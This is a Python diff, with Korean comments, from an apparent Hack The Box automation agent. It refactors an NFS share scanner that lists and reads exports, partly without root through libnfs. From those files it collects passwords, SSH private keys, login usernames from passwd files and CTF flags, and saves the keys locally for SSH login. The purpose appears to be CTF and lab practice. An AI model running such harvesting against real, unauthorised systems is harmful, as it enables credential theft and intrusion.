@@ -60,79 +60,180 @@ class NfsFinding:
     users: list[str] = field(default_factory=list)               # 후보 사용자명(SSH 키 로그인용)
 
 
-def scan_tree(root: str, export: str = "", flag_kind: str = "boot2root",
-              cred_parser=None, flag_scanner=None) -> NfsFinding:
-    """마운트된 디렉터리 트리를 '읽기'로 훑어 자격·SSH 개인키·플래그를 수확한다.
+def _is_keyname(name: str) -> bool:
+    return name in ("id_rsa", "id_ecdsa", "id_ed25519", "id_dsa") or name.endswith(".pem")
 
-    cred_parser(text)->list[(u,p,label)] / flag_scanner(path,text,kind)->iterable(hit) 는
-    주입 가능(기본은 htb_agent.cred_sources / htb_agent.flag 재사용). 바이너리·대용량은 건너뛴다.
-    파일 실행은 절대 하지 않는다(정적 읽기 only)."""
+
+def _notable_name(name: str) -> bool:
+    low = name.lower()
+    return any(k in low for k in ("cred", "pass", "secret", "config", ".env",
+                                  "onboard", "welcome", "readme", "user", "note"))
+
+
+def _harvest_text(fnd: NfsFinding, rel: str, name: str, text: str,
+                  seen_cred: set, seen_flag: set, cred_parser, flag_scanner,
+                  flag_kind: str) -> bool:
+    """한 파일의 '내용(text)'에서 자격·플래그·사용자를 수확한다(키는 호출측이 보존 처리).
+    반환값: 이 파일이 SSH 개인키인가(True 면 호출측이 경로/내용을 ssh_keys 로 보존)."""
+    # 후보 사용자: home/<user>/ 경로 패턴
+    hm = re.search(r"(?:^|/)home/([A-Za-z_][A-Za-z0-9_-]{0,31})/", "/" + rel)
+    if hm and hm.group(1) not in fnd.users:
+        fnd.users.append(hm.group(1))
+    if _PRIVKEY_RE.search(text) or _is_keyname(name):
+        if rel not in fnd.notable:
+            fnd.notable.append(rel)
+        return True
+    # user.txt/root.txt 는 '파일명으로' 종류를 확정해 기록(flag.scan 의 32-hex 맥락 휴리스틱에
+    # 의존하지 않음 — NFS 공유에 user.txt 가 그대로 있는 경우를 확실히 잡는다).
+    low = name.lower()
+    if low in ("user.txt", "root.txt"):
+        from .flag import extract_flags
+        kind = "user" if low == "user.txt" else "root"
+        for val in extract_flags(text):
+            if val not in seen_flag:
+                seen_flag.add(val)
+                fnd.flags.append((kind, val))
+        if rel not in fnd.notable:
+            fnd.notable.append(rel)
+        return False
+    # /etc/passwd 류: 로그인 가능 사용자(uid 1000~65533)
+    if name == "passwd" or rel.endswith("etc/passwd"):
+        for pl in text.splitlines():
+            parts = pl.split(":")
+            if len(parts) >= 7 and parts[2].isdigit() and 1000 <= int(parts[2]) < 65534:
+                if parts[0] and parts[0] not in fnd.users:
+                    fnd.users.append(parts[0])
+    try:
+        for u, p, _label in cred_parser(text):
+            if (u, p) not in seen_cred:
+                seen_cred.add((u, p))
+                fnd.creds.append((u, p))
+    except Exception:   # noqa: BLE001 — 파서 예외는 무시(스캔 지속)
+        pass
+    try:
+        for hit in flag_scanner(f"[nfs] {rel}", text, flag_kind):
+            if hit.value not in seen_flag:
+                seen_flag.add(hit.value)
+                fnd.flags.append((hit.kind, hit.value))
+    except Exception:   # noqa: BLE001
+        pass
+    if _notable_name(name) and rel not in fnd.notable:
+        fnd.notable.append(rel)
+    return False
+
+
+def _resolve_parsers(cred_parser, flag_scanner):
     if cred_parser is None:
         from .cred_sources import parse_config_creds as cred_parser
     if flag_scanner is None:
         from .flag import scan as flag_scanner
+    return cred_parser, flag_scanner
+
+
+def scan_tree(root: str, export: str = "", flag_kind: str = "boot2root",
+              cred_parser=None, flag_scanner=None) -> NfsFinding:
+    """마운트된(or 로컬) 디렉터리 트리를 '읽기'로 훑어 자격·SSH 개인키·플래그를 수확한다.
+    SSH 키는 '로컬 절대경로'로 ssh_keys 에 담는다(마운트 경로 — 호출측이 umount 전 보존 복사).
+    파일 실행은 절대 하지 않는다(정적 읽기 only)."""
+    cred_parser, flag_scanner = _resolve_parsers(cred_parser, flag_scanner)
     fnd = NfsFinding(export=export)
     seen_cred: set[tuple[str, str]] = set()
     seen_flag: set[str] = set()
     count = 0
-    for dirpath, dirs, files in os.walk(root):
+    for dirpath, _dirs, files in os.walk(root):
         for name in files:
             if count >= _MAX_FILES:
                 return fnd
             count += 1
             full = os.path.join(dirpath, name)
             rel = os.path.relpath(full, root)
-            ext = os.path.splitext(name)[1].lower()
-            # 후보 사용자명: home/<user>/ 경로 패턴(.ssh 키가 흔히 여기 있음)
-            hm = re.search(r"(?:^|/)home/([A-Za-z_][A-Za-z0-9_-]{0,31})/", "/" + rel)
-            if hm and hm.group(1) not in fnd.users:
-                fnd.users.append(hm.group(1))
-            # SSH 개인키: 이름 힌트 or 내용 마커(이름이 애매해도 내용으로 확정)
-            is_keyname = name in ("id_rsa", "id_ecdsa", "id_ed25519", "id_dsa") or name.endswith(".pem")
-            if ext in _SKIP_EXT and not is_keyname:
+            if os.path.splitext(name)[1].lower() in _SKIP_EXT and not _is_keyname(name):
                 continue
             try:
-                if os.path.getsize(full) > _MAX_READ and not is_keyname:
+                if os.path.getsize(full) > _MAX_READ and not _is_keyname(name):
                     continue
                 with open(full, encoding="utf-8", errors="replace") as f:
                     text = f.read(_MAX_READ)
             except OSError:
                 continue
-            if _PRIVKEY_RE.search(text) or is_keyname:
+            if _harvest_text(fnd, rel, name, text, seen_cred, seen_flag,
+                             cred_parser, flag_scanner, flag_kind):
                 if full not in fnd.ssh_keys:
-                    fnd.ssh_keys.append(full)
-                    fnd.notable.append(rel)
-                continue
-            # /etc/passwd 류: 로그인 가능한 사용자(uid 1000~65533) 수집(SSH 키 로그인 후보)
-            if name == "passwd" or rel.endswith("etc/passwd"):
-                for pl in text.splitlines():
-                    parts = pl.split(":")
-                    if len(parts) >= 7 and parts[2].isdigit() and 1000 <= int(parts[2]) < 65534:
-                        if parts[0] and parts[0] not in fnd.users:
-                            fnd.users.append(parts[0])
-            # 자격 파싱(기존 설정파일 파서 재사용)
-            try:
-                for u, p, _label in cred_parser(text):
-                    if (u, p) not in seen_cred:
-                        seen_cred.add((u, p))
-                        fnd.creds.append((u, p))
-            except Exception:   # noqa: BLE001 — 파서 예외는 무시(스캔 지속)
-                pass
-            # 플래그 스캔(기존 flag.scan 재사용)
-            try:
-                for hit in flag_scanner(f"[nfs] {rel}", text, flag_kind):
-                    if hit.value not in seen_flag:
-                        seen_flag.add(hit.value)
-                        fnd.flags.append((hit.kind, hit.value))
-            except Exception:   # noqa: BLE001
-                pass
-            # 안내용: 자격·설정이 있을 법한 파일명
-            low = name.lower()
-            if any(k in low for k in ("cred", "pass", "secret", "config", ".env",
-                                      "onboard", "welcome", "readme", "user", "note")):
-                if rel not in fnd.notable:
-                    fnd.notable.append(rel)
+                    fnd.ssh_keys.append(full)   # 마운트 경로(로컬 절대경로)
     return fnd
+
+
+# ── rootless NFS 읽기(libnfs: nfs-ls/nfs-cp — sudo·마운트 불필요) ─────────────
+# 기본(권장) 경로: 커널 마운트·root 없이 유저스페이스로 export 를 나열·읽는다 → 자동화·안전 둘 다.
+# 실제 nfs-ls/nfs-cp 실행은 주입 가능한 run(argv)->(rc,out) 로 분리(테스트·러너 호환).
+def have_libnfs(which_fn=None) -> bool:
+    """rootless NFS 도구(libnfs-utils 의 nfs-ls)가 설치돼 있는가."""
+    import shutil
+    w = which_fn or shutil.which
+    return bool(w("nfs-ls"))
+
+
+def _nfs_url(ip: str, export: str, path: str = "") -> str:
+    # export 는 '/srv/nfs/onboarding', path 는 '/home/nico/id_rsa'(선행 / 포함/미포함 모두 허용)
+    tail = ("/" + path.lstrip("/")) if path else ""
+    return f"nfs://{ip}{export}{tail}"
+
+
+def parse_nfs_ls(output: str) -> list[str]:
+    """`nfs-ls -R nfs://ip/export` 출력에서 '파일 상대경로'를 뽑는다(디렉터리/빈줄 제외).
+    libnfs nfs-ls 는 재귀 시 각 항목을 경로로 출력한다. 장식(퍼미션/타입 프리픽스)이 붙을 수
+    있어, 각 줄의 '마지막 토큰'을 경로 후보로 보고, 디렉터리 표식(끝 '/')·'.'/'..' 은 제외한다."""
+    out: list[str] = []
+    for raw in (output or "").splitlines():
+        line = raw.strip()
+        if not line or line in (".", ".."):
+            continue
+        tok = line.split()[-1]            # 'drwx... name' 형식이면 마지막 토큰이 경로
+        if tok.endswith("/") or tok in (".", ".."):
+            continue
+        tok = tok.lstrip("./")
+        if tok and tok not in out:
+            out.append(tok)
+    return out
+
+
+def scan_via_libnfs(ip: str, export: str, run, keystore: str,
+                    flag_kind: str = "boot2root", cred_parser=None, flag_scanner=None,
+                    max_files: int = 400) -> tuple["NfsFinding", bool]:
+    """rootless(libnfs)로 export 를 나열·읽어 수확한다. SSH 키는 nfs-cp 로 로컬 keystore 에
+    0600 저장(마운트 없음). run(argv)->(rc,out) 주입. (NfsFinding, ok) 반환 — ok=False 면
+    목록 실패(상위가 --priv-env sudo 마운트/수동안내로 폴백). 원격에서 아무 것도 실행하지 않음."""
+    cred_parser, flag_scanner = _resolve_parsers(cred_parser, flag_scanner)
+    fnd = NfsFinding(export=export)
+    rc, out = run(["nfs-ls", "-R", _nfs_url(ip, export)])
+    paths = parse_nfs_ls(out) if rc == 0 else []
+    if rc != 0:
+        return fnd, False
+    seen_cred: set[tuple[str, str]] = set()
+    seen_flag: set[str] = set()
+    key_idx = 0
+    for rel in paths[:max_files]:
+        name = rel.rsplit("/", 1)[-1]
+        if os.path.splitext(name)[1].lower() in _SKIP_EXT and not _is_keyname(name):
+            continue
+        rc2, content = run(["nfs-cp", _nfs_url(ip, export, rel), "-"])
+        if rc2 != 0 or not content:
+            continue
+        text = content[:_MAX_READ]
+        if _harvest_text(fnd, rel, name, text, seen_cred, seen_flag,
+                         cred_parser, flag_scanner, flag_kind):
+            # 키는 로컬에 0600 보존(SSH 로그인용) — 마운트 없이 nfs-cp 로 받은 내용 저장
+            try:
+                os.makedirs(keystore, exist_ok=True)
+                dest = os.path.join(keystore, f"key_{key_idx}")
+                with open(dest, "w", encoding="utf-8") as f:
+                    f.write(text)
+                os.chmod(dest, 0o600)
+                fnd.ssh_keys.append(dest)
+                key_idx += 1
+            except OSError:
+                pass
+    return fnd, True
 
 
 # ── 실제 마운트/언마운트(root 필요 — 주입 가능, 기본은 sudo -n) ────────────
